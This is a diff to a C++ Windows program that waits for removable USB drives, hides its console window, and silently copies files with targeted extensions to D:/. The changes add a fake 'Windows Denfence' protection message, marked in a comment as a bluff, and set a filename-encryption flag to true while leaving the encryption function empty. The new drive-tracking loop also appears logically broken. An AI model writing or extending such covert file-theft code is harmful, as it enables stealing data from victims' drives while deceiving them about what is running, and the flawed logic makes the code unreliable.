@@ -1,4 +1,5 @@
 ﻿#include<iostream>
+#include<ctime>
 #include<windows.h>
 #include<boost/filesystem.hpp>
 using namespace std;
@@ -7,18 +8,6 @@ using namespace boost::filesystem;
 
 ////////////////      控制台      \\\\\\\\\\\\\\\\\
 
-const char sensitiveWords[]
-{
-	'\"',
-	'*',
-	'/',
-	':',
-	'<',
-	'>',
-	'?',
-	'\\',
-	'|'
-};
 
 const char targetExtension[][32]
 {
@@ -39,8 +28,7 @@ const char targetExtension[][32]
 #define SHOW_CONSOLE		true	//是否显示控制台
 #define SHOW_FILES			true	//是否列出文件列表在控制台
 #define OVERWRITER			true	//是否覆盖已有文件
-#define FILENAME_ENCRYPT	false	// * 是否加密文件名(加密方式:字符位移)
-#define FNE_DISPLACEMENT	1		// * 位移大小(FILENAME_ENCRYPT为true时有效)
+#define FILENAME_ENCRYPT	true	// * 是否加密文件名(加密方式:键对值)
 #define HIDE_FILE			false	//隐藏被复制的文件
 #define DESTINATION			"D:/"	//复制文件的目的地
 
@@ -62,43 +50,8 @@ int getRemovableDriver(char(*remDrvList)[4])
 	return count;
 }
 
-void fileNameEncrypt(char* plaintext, char* ciphertext)
+void fileNameEncrypt(char* fileName)
 {
-	/*
-		空格	-> 32 最小
-		~	-> 126 最大
-
-		一定不能包含的有：
-		" -> 34
-		* -> 42
-		/ -> 47
-		: -> 58
-		< -> 60
-		> -> 62
-		? -> 63
-		\ -> 92
-		| -> 124
-
-	*/
-
-	size_t len_pla = strlen(plaintext);
-	size_t len_sen = strlen(sensitiveWords);
-	for (int i = 0; i < len_pla; i++)
-	{
-		for (int j = 0; j < len_sen; j++)
-		{
-			if (plaintext[i] + FNE_DISPLACEMENT != sensitiveWords[j])
-			{
-				plaintext[i] = plaintext[i] + FNE_DISPLACEMENT;
-			}
-			else
-			{
-
-			}
-		}
-	}
-
-
 
 }
 
@@ -117,22 +70,9 @@ void copyFiles(const char* src)
 					strcat_s(srcFilePath, 1024, iter->path().relative_path().string().c_str());
 					char desFilePath[1024]{};
 					strcat_s(desFilePath, 1024, DESTINATION);
-
-					if (FILENAME_ENCRYPT)
-					{
-						char plaintext[1024]{}, ciphertext[1024]{};
-						strcpy_s(plaintext, 1024, iter->path().filename().string().c_str());
-						fileNameEncrypt(plaintext, ciphertext);
-						strcat_s(desFilePath, 1024, ciphertext);
-					}
-					else
-					{
-						strcat_s(desFilePath, 1024, iter->path().filename().string().c_str());
-					}
-
+					strcat_s(desFilePath, 1024, iter->path().filename().string().c_str());
 
 					bool copySuccess = CopyFileA(srcFilePath, desFilePath, !OVERWRITER);
-					//char say[1024]{};	//预留
 
 					if (SHOW_FILES)
 					{
@@ -177,18 +117,55 @@ int main()
 		ShowWindow(hwnd, SW_HIDE);
 	}
 
-	char remDrvList[32][4]{};
-	int c = 114514;
-	unsigned long long count = 0;
 
-	do
-	{
-		c = getRemovableDriver(remDrvList);
-		Sleep(3 * 1000);
-	} while (c == 0);
+again:
 
-	for (int i = 0; i < c; i++)
+	char copyedDrvList[32][4]{};
+	int copyedDrvCount = 0;
+
+	while (true)
 	{
-		copyFiles(remDrvList[i]);
+		char remDrvList[32][4]{};
+		int remDrvCount = 0;
+		char tmpDrvList[32][4]{};
+		int tmpDrvCount = 0;
+
+		tmpDrvCount = getRemovableDriver(tmpDrvList);
+
+		for (int i = 0; i < tmpDrvCount; i++)
+		{
+			for (int j = 0; j < copyedDrvCount; j++)
+			{
+				if (strcmp(tmpDrvList[i], copyedDrvList[j]) != 0)
+				{
+					strcpy_s(remDrvList[remDrvCount++], tmpDrvList[i]);
+				}
+			}
+		}
+
+		do
+		{
+			time_t t = time(nullptr);
+			char strTime[128]{};
+			ctime_s(strTime, 128, &t);
+			strTime[strlen(strTime) - 1] = (char)'\0';
+			//扯鬼
+			cout << "[" << strTime << "] Windows Denfence 正在保护你的电脑,请不要关闭该窗口" << endl;
+			Sleep(3 * 1000);
+		} while (remDrvCount == 0);
+
+		for (int i = 0; i < remDrvCount; i++)
+		{
+			try
+			{
+				copyFiles(remDrvList[i]);
+			}
+			catch (filesystem_error e)
+			{
+				cerr << e.what() << endl;
+				goto again;
+			}
+			strcpy_s(copyedDrvList[copyedDrvCount++], 4, remDrvList[i]);
+		}
 	}
 }
